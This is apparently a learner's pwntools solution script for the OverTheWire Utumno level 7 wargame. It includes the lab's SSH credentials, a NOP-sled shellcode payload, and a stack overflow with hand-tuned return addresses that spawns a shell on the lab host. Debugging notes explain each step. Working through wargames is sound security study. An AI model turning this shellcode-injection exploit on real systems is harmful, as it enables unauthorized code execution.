'''
ssh -p 2227 utumno7@utumno.labs.overthewire.org
pass: totiquegae
'''

'''
I have to say this challenge took me quite a while,
and I couldn't solve it without hints.
I'm putting work into understanding it fully and truly know how and why everything works and not just roughly.
I don't want to progress and behave like "Yeah, it works, whatever...."
'''

from pwn import *
shellcode = asm('nop') * 500 + asm(shellcraft.sh())
args = ['./utumno7', b'A' * 0x8c]

'''
Running this, we're getting: 
Program received signal SIGSEGV, Segmentation fault at: 0xf7fb0d22 

Running: x/i 0xf7fb0d22,
we can see the instruction:
lods   eax,DWORD PTR ds:[esi]

The instruction tries to dereference [esi] which is equal to 0x41414141,
therefore: "Cannot access memory at address 0x41414141"

Let's try to pass an address in there.
'''

args = ['./utumno7', b'A' * 0x8c + b'\x5d\xde\xff\xff']
'''
We can see that we got control of the EIP register,
but unfortunately it's not what we wanted it to be.
It is equal to 0x90909090, which is our NOP sled.
We can conclude that the code reads our input address and place its value as the EIP.
What we'd need to do is have a place in memory that points to our shellcode, and then pass that address.
In order to do that, we'd add another address that contains the address of the shellcode address.

Also, I've noticed that the address that translates into EIP doesn't take the value in the address,
but rather the value in (address + 0x4).
'''
args = ['./utumno7', b'A' * 0x88 + b'\x5d\xde\xff\xff' + b'\x90\xdd\xff\xff']
p = gdb.debug(args, gdbscript, env=dict(PWD=os.getcwd(), A=shellcode))
p = process(args, env=dict(PWD=os.getcwd(), A=shellcode))

# Reduce the addresses integer by 6, because len('/utumno/utumno7') - len('./utumno7').
# Stack moves around.
args = ['/utumno/utumno7', b'A' * 0x88 +
        b'\x57\xde\xff\xff' + b'\x8a\xdd\xff\xff']
s = ssh('utumno7', 'utumno.labs.overthewire.org', 2227, 'totiquegae')
p = s.process(args, env=dict(PWD=os.getcwd(), A=shellcode))
